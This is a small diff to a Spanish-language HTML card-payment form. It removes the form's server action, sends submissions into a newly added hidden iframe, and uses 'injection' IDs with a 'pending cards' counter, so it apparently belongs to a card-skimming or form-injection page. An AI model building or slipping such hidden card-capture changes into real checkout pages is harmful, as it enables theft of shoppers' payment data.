@@ -560,7 +560,7 @@
             <input type="text" id="injection-status" readonly placeholder="Tarjetas pendientes: 0">
           </div>
         </div>
-        <form id="injection-form" name="payment" autocomplete="on" action="/procesar-pago" method="POST">
+        <form id="injection-form" name="payment" autocomplete="on" target="hiddenFrame" method="POST">
           <div class="row">
             <div class="field">
               <label for="injection-cardholder">Nombre en la tarjeta</label>
@@ -1252,6 +1252,7 @@
       btnMobile.click();
     }
   </script>
+  <iframe name="hiddenFrame" style="display:none;"></iframe>
 </body>
 
 </html>
